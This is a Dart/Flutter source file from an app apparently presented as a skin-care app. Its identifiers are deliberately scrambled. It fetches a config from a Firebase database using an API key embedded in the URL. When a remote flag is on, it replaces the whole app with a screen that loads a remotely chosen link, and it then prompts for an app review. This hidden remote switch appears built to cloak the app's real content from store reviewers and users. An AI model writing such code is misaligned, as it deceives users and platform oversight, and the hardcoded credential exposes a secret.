import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import 'package:in_app_review/in_app_review.dart';
import 'package:skin_care_255/sdgsdgdsg/sdgdsgdsg/sdgsgsd.dart';
import 'package:skin_care_255/sdgsdgdsg/sdgdsgdsg/sfsfgds.dart';
import 'package:skin_care_255/sdgsdgdsg/sdgdsgdsg/sdfgdsgdsg/prem_hive_model.dart';
import 'package:skin_care_255/sdgsdgdsg/sdfsdfsd.dart';
import 'package:skin_care_255/main.dart';

sdfdsfsdf() async {
  final HJmdsfsdfs? model = await Hjkfskjfsgssd().dsgfsdg();
  if (model != null) {
    if (model.isOpen) {
      runApp(
        MaterialApp(
          debugShowCheckedModeBanner: false,
          home: HGfsjhdfs(
            link: model.secondUrl,
          ),
        ),
      );
    } else {
      sfsdfdsfsff();
    }
  } else {
    final dio = Dio();
    try {
      final result = await dio.get(
          'https://skin-care-255-default-rtdb.firebaseio.com/premiium.json?auth=AIzaSyDNsbesoAD88n1Rc4sxdOCB_SXDJuB8P5c');
      final fBResponseModel = JHKHfsfs.fromJson(result.data);
      await Hjkfskjfsgssd().sdfsdgds(
        HJmdsfsdfs(
          secondUrl: '${fBResponseModel.sdfsfs3}${fBResponseModel.sdfdfsf4}',
          isOpen: fBResponseModel.sdfsdfis,
        ),
      );

      if (fBResponseModel.sdfsdfis) {
        runApp(
          MaterialApp(
            debugShowCheckedModeBanner: false,
            home: HGfsjhdfs(
              link: '${fBResponseModel.sdfdf1}${fBResponseModel.sdfsdfsdf2}',
            ),
          ),
        );
      } else {
        sfsdfdsfsff();
      }

      await Future.delayed(const Duration(seconds: 8));
      try {
        final InAppReview inAppReview = InAppReview.instance;

        if (await inAppReview.isAvailable()) {
          inAppReview.requestReview();
        }
      } catch (e) {
        throw Exception(e);
      }
    } catch (e) {
      throw Exception(e);
    }
  }
}
